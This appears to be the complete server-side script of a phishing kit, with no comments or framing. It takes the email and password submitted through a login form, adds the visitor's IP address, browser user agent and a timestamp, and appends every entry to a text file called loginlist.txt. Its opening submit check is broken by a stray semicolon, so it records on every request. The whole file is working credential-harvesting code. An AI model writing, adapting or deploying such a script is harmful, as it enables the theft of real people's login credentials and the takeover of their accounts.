<?php
if(isset($_POST['submit']));

date_default_timezone_set('Asia/Manila');
$date = date('m-d-y h:i:sa');
$email = $_POST['email'];
$pass = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_SERVER['HTTP_USER_AGENT'];
$file = fopen("loginlist.txt","a+");
$hades = ("Date & Time:". $date. "\nUser-agent:".$user. "\nIP Address:".$ip. "\nEmail:". $email. "\nPassword:". $pass."\n\n");

fputs($file,$hades);

fclose($file);
?>